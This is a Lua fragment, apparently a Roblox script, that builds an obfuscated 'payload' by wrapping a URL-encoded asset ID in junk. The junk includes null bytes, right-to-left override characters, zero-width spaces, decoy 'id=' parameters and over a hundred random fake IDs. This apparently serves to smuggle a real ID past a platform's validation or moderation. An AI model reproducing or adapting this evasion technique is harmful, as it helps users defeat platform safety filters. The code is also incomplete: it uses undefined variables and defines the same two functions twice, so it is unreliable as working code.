local _JUNK_SUFFIX_RAW ="&%00%00%39%39%39%39%32%37%32%39%39%34%37%34%34%34&%00&%00&%00&%00%E2%80%AE&​%69%64=00%31%30%37%38%37%30%33%37%37%32%39%34%30&%00&%00&%00&%00%E2%80%AE&​%69%64=%31%36%39%33%39%33%32%38%33%39%30%34%37%32%34%33&%00&%00&%00&%00%E2%80%AE&​%69%64=00%31%30%36%38%31%37%37%37%37%32%36%34%30%33%38%31%33%39%33%32%33%37%39%33%34%30%34%38%34&%00&%00&%00&%00%E2%80%AE&​%69%64=00%31%30%36%39%39%30%30%37%37%30%36%34%34&%00&%00&%00&%00%E2%80%AE&​%69%64=%31%34%39%33%34%33%32%38%32%39%34%34%37%34%34%33&%00&%00&%00&%00%E2%80%AE&​%69%64=00%31%30%36%38%30"
local _EXTRA_FAKE = 104
local _extraIds = {}
for i = 1, _EXTRA_FAKE do
    local pick = i % 4
    local n
    if pick == 0 then
        n = math.random(1000000000, 9999999999)
    elseif pick == 1 then
        n = math.random(10000000000, 99999999999)
    elseif pick == 2 then
        n = math.random(100000000000, 999999999999)
    else
        n = math.random(10000000000000, 19999999999999)
    end
    _extraIds[i] = "id=" .. n
end
local _EXTRA_JUNK = table.concat(_extraIds, "&") .. "&"
local _JUNK_PREFIX = _JUNK_RAW:gsub("%(RLO%)", _RLO)
local _JUNK_SUFFIX = _JUNK_SUFFIX_RAW:gsub("%(RLO%)", _RLO) .. _EXTRA_JUNK

-- ===============================
-- URL Encode (สั้น)
-- ===============================
local function _urlEncode(id)
    local h, r = "0123456789ABCDEF", ""
    for i = 1, #id do
        local b = string.byte(id, i)
        r = r .. "%" .. h:sub(math.floor(b/16)+1, math.floor(b/16)+1) .. h:sub(b%16+1, b%16+1)
    end
    return r
end

-- ===============================
-- Build Payload (สั้น)
-- ===============================
local function _buildPayload(rawId)
    return _JUNK_PREFIX .. _urlEncode(rawId) .. _JUNK_SUFFIX
end

-- ===============================
-- URL Encode
-- ==============================\n
local function _urlEncode(id)
    local _hx = "0123456789ABCDEF"
    local r = ""
    for i = 1, #id do
        local b = string.byte(id, i)
        r = r .. "%" .. string.sub(_hx, math.floor(b/16)+1, math.floor(b/16)+1) .. string.sub(_hx, (b%16)+1, (b%16)+1)
    end
    return r
end

-- ===============================
-- สร้าง payload = junk prefix + urlencode(id) + junk suffix
-- ===============================
local function _buildPayload(rawId)
    return _JUNK_PREFIX .. _urlEncode(rawId) .. _JUNK_SUFFIX
end

